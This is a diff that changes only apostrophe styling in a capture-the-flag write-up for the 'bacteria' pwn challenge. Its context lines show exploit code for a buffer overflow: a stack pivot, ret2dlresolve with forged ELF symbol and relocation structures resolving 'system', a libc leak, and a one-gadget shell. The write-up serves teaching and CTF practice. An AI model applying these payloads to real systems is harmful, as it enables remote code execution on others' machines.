@@ -33,7 +33,7 @@ Download the tar and untar it, then build with the following command (require [d
 docker-compose build && docker-compose up
 ```
 
-And now we're ready for the exploitation!
+And now we’re ready for the exploitation!
 
 ## 1. Find bug
 
@@ -63,17 +63,17 @@ This is a small binary with just a few assembly code as below:
 
 So we have `read@plt`, `read@got` and `.text` part. In `.text`, it first read in 0x20 byte to the current rsp and then set the null byte after that input. Finally it add rsp with 0x10 and return.
 
-So that's means we have the **Buffer Overflow** bug and that's all, we cannot find anything else. So let's move on the next part: Brainstorming!
+So that’s means we have the **Buffer Overflow** bug and that’s all, we cannot find anything else. So let’s move on the next part: Brainstorming!
 
 ## 2. Brainstorming
 
-First, we have the **Buffer Overflow** bug but because the space for our payload is too small so I intent to do a stack pivot first. But the challenge file has `NX enabled` so we cannot execute assembly shellcode on it. Also because the binary is small, we don't have any gadget to conduct a full ROPgadget or even just a part of ROPgadget.
+First, we have the **Buffer Overflow** bug but because the space for our payload is too small so I intent to do a stack pivot first. But the challenge file has `NX enabled` so we cannot execute assembly shellcode on it. Also because the binary is small, we don’t have any gadget to conduct a full ROPgadget or even just a part of ROPgadget.
 
-But we have `read@plt`, which means it will need to resolve the libc address for the first time. So we have the dlresolver function, all we need now is a `ret2dlresolve`. If you don't know what it is, you can read [here](https://github.com/nhtri2003gmail/ret2dlresolve-64bit).
+But we have `read@plt`, which means it will need to resolve the libc address for the first time. So we have the dlresolver function, all we need now is a `ret2dlresolve`. If you don’t know what it is, you can read [here](https://github.com/nhtri2003gmail/ret2dlresolve-64bit).
 
 First, this is a 64-bit file so using `ret2dlresolve` technique may work and may not work for some special case. And we can conduct this technique by 2 ways: faking `link_map` or faking `reloc_arg`
 
-In this challenge, I know that we can fake `reloc_arg` because the base address of binary is `0x400000` so `ret2dlresolve` will not cause error (if base address is `0x600000`, the check function of dlresolver will cause error), also because we don't have any thing to leak `link_map` and to overwrite `link_map` data.
+In this challenge, I know that we can fake `reloc_arg` because the base address of binary is `0x400000` so `ret2dlresolve` will not cause error (if base address is `0x600000`, the check function of dlresolver will cause error), also because we don’t have any thing to leak `link_map` and to overwrite `link_map` data.
 
 So first, we will try to fake some structures to conduct `ret2dlresolve` to execute whatever function we want. Next, we will try to leak the libc address and then use one gadget to get shell.
 
@@ -132,13 +132,13 @@ gef➤  x/s     (STRTAB) + (st_name)
 
 ### Stage 1: Stack pivot
 
-First, let's attach gdb to the process of bacteria in the container to get the read & write section so that we can do stack pivot:
+First, let’s attach gdb to the process of bacteria in the container to get the read & write section so that we can do stack pivot:
 
 ![get_rw_section.png](/static/images/tsjctf-2022/bacteria/get_rw_section.png)
 
-So we know that at address from `0x403000` to `0x404000`, the binary is writable. So we will choose an address of `0x403e00` to stack pivot. Why I choose `0x403e00`, because after the stack pivot, we will conduct the ret2dlresolve, which will need a lot of lower memory to resolve libc address. Choosing `0x403e00` so we don't need to change a lot.
+So we know that at address from `0x403000` to `0x404000`, the binary is writable. So we will choose an address of `0x403e00` to stack pivot. Why I choose `0x403e00`, because after the stack pivot, we will conduct the ret2dlresolve, which will need a lot of lower memory to resolve libc address. Choosing `0x403e00` so we don’t need to change a lot.
 
-To do the stack pivot, we also need a `leave; ret` gadget to change the rsp. But because we will execute the `.text` again so we have `leave; ret` already. One more thing to notice is that after we stack pivot, the new stack now is inside the binary which doesn't have any thing for us to work around. So before we do the stack pivot, we need to write something to the chosen address first.
+To do the stack pivot, we also need a `leave; ret` gadget to change the rsp. But because we will execute the `.text` again so we have `leave; ret` already. One more thing to notice is that after we stack pivot, the new stack now is inside the binary which doesn’t have any thing for us to work around. So before we do the stack pivot, we need to write something to the chosen address first.
 
 As we know that the program will first mov the current rsp to rbp and then mov rbp to rsi and write to rsi. So we just need `mov rsi, rbp` to write to our desired address passed to rsi by rbp. Our first payload will be as following:
 
@@ -148,11 +148,11 @@ mov_rsi_rbp_read = 0x401027
 
 payload = p64(rw_section)
 payload += p64(mov_rsi_rbp_read)
-payload += p64(0)*2                 # Just for padding so that we don't need to sleep()
+payload += p64(0)*2                 # Just for padding so that we don’t need to sleep()
 p.send(payload)
 ```
 
-Running script and we stop at ret, we can see that it's ready for the next input of 0x20 bytes to the rw_section (by looking at rbp)
+Running script and we stop at ret, we can see that it’s ready for the next input of 0x20 bytes to the rw_section (by looking at rbp)
 
 Status of rbp:
 ![rw_section_rbp.png](/static/images/tsjctf-2022/bacteria/rw_section_rbp.png)
@@ -160,7 +160,7 @@ Status of rbp:
 Status of code:
 ![rw_section_code.png](/static/images/tsjctf-2022/bacteria/rw_section_code.png)
 
-That's look good! Just leave it here for a while and we will continue building exploit later.
+That’s look good! Just leave it here for a while and we will continue building exploit later.
 
 ### Stage 2: Fake address and structure of Elf64_Sym
 
@@ -207,12 +207,12 @@ st_other = p8(0)
 st_shndx = p16(0)
 st_value = p64(0)
 # st_size is null already because the stack now contain all null byte
-# so we don't need to write these variable, just need to pad full 0x10
-# bytes so that we don't need to sleep()
+# so we don’t need to write these variable, just need to pad full 0x10
+# bytes so that we don’t need to sleep()
 Elf64_Sym_struct = st_name + st_info + st_other + st_shndx
 ```
 
-Because we haven't build up structure for STRTAB so st_name will be `0xdeadbeef`, just temporary and will change when STRTAB is finished. Now we will leave it here and continue with the second struct: Elf64_Rela!
+Because we haven’t build up structure for STRTAB so st_name will be `0xdeadbeef`, just temporary and will change when STRTAB is finished. Now we will leave it here and continue with the second struct: Elf64_Rela!
 
 ### Stage 3: Fake address and structure of Elf64_Rela
 
@@ -250,7 +250,7 @@ So our struct for Elf64_Rela will be as following:
 ```python
 r_offset = p64(0xdeadbeef)         # Unknown, temporary
 r_info = p64((symbol_number << 32) | 0x7)
-# r_addend is null and stack is null already so we don't need to write this,
+# r_addend is null and stack is null already so we don’t need to write this,
 # also because we run out of 0x10 bytes we can write
 Elf64_Rela_struct = r_offset + r_info
 ```
@@ -266,7 +266,7 @@ As 2 part above does at the begining, we will choose the address for STRTAB firs
 <=> <st_name> = <Address for STRTAB> - <STRTAB>
 ```
 
-So this is easier because we don't have a division in the calculation. So we will choose any address which doesn't overwrite the other data:
+So this is easier because we don’t have a division in the calculation. So we will choose any address which doesn’t overwrite the other data:
 
 ```
 STRTAB_addr  = rw_section + 0x80     = 0x403e80
@@ -277,10 +277,10 @@ And the struct for STRTAB is just simply a string contain the function we want:
 
 ```python
 STRTAB_struct = b'system\x00\x00'
-STRTAB_struct += p64(0)              # Just for padding so we don't need to sleep() when read
+STRTAB_struct += p64(0)              # Just for padding so we don’t need to sleep() when read
 ```
 
-From here, we have 2 things we haven't done is st_name of Elf64_Sym and r_offset of Elf64_Rela. For st_name, we can get that from STRTAB above so stage 2 will change like this:
+From here, we have 2 things we haven’t done is st_name of Elf64_Sym and r_offset of Elf64_Rela. For st_name, we can get that from STRTAB above so stage 2 will change like this:
 
 ```python
 SYMTAB = 0x400290
@@ -294,8 +294,8 @@ st_other = p8(0)
 st_shndx = p16(0)
 st_value = p64(0)
 # st_size is null already because the stack now contain all null byte
-# so we don't need to write these variable, just need to pad full 0x10
-# bytes so that we don't need to sleep()
+# so we don’t need to write these variable, just need to pad full 0x10
+# bytes so that we don’t need to sleep()
 Elf64_Sym_struct = st_name + st_info + st_other + st_shndx + st_value
 ```
 
@@ -311,7 +311,7 @@ mov_rsi_rbp_read = 0x401027
 
 payload = p64(rw_section)           # Fake rbp
 payload += p64(mov_rsi_rbp_read)    # rip
-payload += p(0)*2                   # Just for padding so that we don't need to sleep()
+payload += p(0)*2                   # Just for padding so that we don’t need to sleep()
 p.send(payload)
 ```
 
@@ -323,11 +323,11 @@ mov_rsi_rbp_read = 0x401027
 
 payload = p64(rw_section - 0x10)    # Fake rbp
 payload += p64(mov_rsi_rbp_read)    # rip
-payload += p64(0)*2                   # Just for padding so that we don't need to sleep()
+payload += p64(0)*2                   # Just for padding so that we don’t need to sleep()
 p.send(payload)
 ```
 
-Because we want the Elf64_Sym structure is placed at the correct address so we subtract with 0x10 so that in the next input, we will write the first 0x10 of fake rbp and rip, then the next 0x10 is the Elf64_Sym in the correct address. And when it read for the second time, which means it's reading to the address of rw_section - 0x10. So we will write the ELf64_Sym struct to here with following code:
+Because we want the Elf64_Sym structure is placed at the correct address so we subtract with 0x10 so that in the next input, we will write the first 0x10 of fake rbp and rip, then the next 0x10 is the Elf64_Sym in the correct address. And when it read for the second time, which means it’s reading to the address of rw_section - 0x10. So we will write the ELf64_Sym struct to here with following code:
 
 ```python
 # Write Elf64_Sym structure
@@ -367,13 +367,13 @@ and run with GDB attached for debuging:
 
 ![check_reloc_arg.png](/static/images/tsjctf-2022/bacteria/check_reloc_arg.png)
 
-We can see that it send 0x20 bytes which fit read() so we are sure that every payload is sent correctly. Let's run until we have inputed all struct and check with the reloc_arg:
+We can see that it send 0x20 bytes which fit read() so we are sure that every payload is sent correctly. Let’s run until we have inputed all struct and check with the reloc_arg:
 
 ![check_structures_position.png](/static/images/tsjctf-2022/bacteria/check_structures_position.png)
 
 We can see that all of our struct are in the correct position. Now we just need an address of r_offset to puts the resolved function to it. We want when it has just resolved, it will print out the resolved address immediately. Which means when we have just write STRTAB structure, we will write the dlresolver to r_offset. After it resolve, it will print out the libc address which rsi is holding the pointer.
 
-So the dlresolver and r_offset is in the same address. Because we don't want the JMPREL, SYMTAB and STRTAB structure to be overwriten or it might cause error. And also because dlresolve will use the lower stack address to resolve this so choosing lower address is an great idea. We will use address of `rw_section - 0x50` for both r_offset and dlresolver so the stage 3 will change to this:
+So the dlresolver and r_offset is in the same address. Because we don’t want the JMPREL, SYMTAB and STRTAB structure to be overwriten or it might cause error. And also because dlresolve will use the lower stack address to resolve this so choosing lower address is an great idea. We will use address of `rw_section - 0x50` for both r_offset and dlresolver so the stage 3 will change to this:
 
 ```python
 JMPREL = 0x400300
@@ -383,7 +383,7 @@ reloc_arg = int( (Elf64_Rela_addr - JMPREL) / 24 )
 
 r_offset = p64(rw_section - 0x50)         # Change here
 r_info = p64((symbol_number << 32) | 0x7)
-# r_addend is null and stack is null already so we don't need to write this,
+# r_addend is null and stack is null already so we don’t need to write this,
 # also because we run out of 0x10 bytes we can write
 Elf64_Rela_struct = r_offset + r_info
 ```
@@ -431,7 +431,7 @@ Running script to here and debug with gdb, we know we ret2dlresolve successfully
 
 ![get_write_libc_function.png](/static/images/tsjctf-2022/bacteria/get_write_libc_function.png)
 
-This is the function write in libc. Let's check if the rsi contain the address point to r_offset or not:
+This is the function write in libc. Let’s check if the rsi contain the address point to r_offset or not:
 
 ![rsi_contain_write_libc_address.png](/static/images/tsjctf-2022/bacteria/rsi_contain_write_libc_address.png)
 
@@ -457,7 +457,7 @@ Check with libc in GDB and we get the same address:
 
 ![get_libc_base_GDB.png](/static/images/tsjctf-2022/bacteria/get_libc_base_GDB.png)
 
-What a long way! Let's keep going cause we are very close to flag.
+What a long way! Let’s keep going cause we are very close to flag.
 
 ### Stage 6. Get shell
 
@@ -485,7 +485,7 @@ $ ROPgadget --binary libc-2.31.so --ropchain | grep xor | grep r12 | grep ret
 0x00000000000d31f0 : xor r12d, r12d ; mov rax, r12 ; pop r12 ; ret
 ```
 
-We will use this to clear the r12. I use xor because we don't need to add those `p64(0)` then pop in a limited space like this situation. Before we continue, let choose any address for rbp in the write of ret2dlresolve so that it will jump to there after the leak. I will choose the rw_section (because now we don't need stack more) so the code for ret2dlresolve will look like this:
+We will use this to clear the r12. I use xor because we don’t need to add those `p64(0)` then pop in a limited space like this situation. Before we continue, let choose any address for rbp in the write of ret2dlresolve so that it will jump to there after the leak. I will choose the rw_section (because now we don’t need stack more) so the code for ret2dlresolve will look like this:
 
 ```python
 # Conduct ret2dlresolve
@@ -563,7 +563,7 @@ mov_rsi_rbp_read = 0x401027
 
 payload = p64(rw_section - 0x10)    # Fake rbp
 payload += p64(mov_rsi_rbp_read)    # rip
-payload += p64(0)*2                 # Just for padding so that we don't need to sleep()
+payload += p64(0)*2                 # Just for padding so that we don’t need to sleep()
 p.send(payload)
 
 ########################################################
@@ -580,8 +580,8 @@ st_other = p8(0)
 st_shndx = p16(0)
 st_value = p64(0)
 # st_size is null already because the stack now contain all null byte
-# so we don't need to write these variable, just need to pad full 0x10
-# bytes so that we don't need to sleep()
+# so we don’t need to write these variable, just need to pad full 0x10
+# bytes so that we don’t need to sleep()
 Elf64_Sym_struct = st_name + st_info + st_other + st_shndx + st_value
 
 #########################################################
@@ -594,7 +594,7 @@ reloc_arg = int( (Elf64_Rela_addr - JMPREL) / 24 )
 
 r_offset = p64(rw_section - 0x50)         # Change here
 r_info = p64((symbol_number << 32) | 0x7)
-# r_addend is null and stack is null already so we don't need to write this,
+# r_addend is null and stack is null already so we don’t need to write this,
 # also because we run out of 0x10 bytes we can write
 Elf64_Rela_struct = r_offset + r_info
 
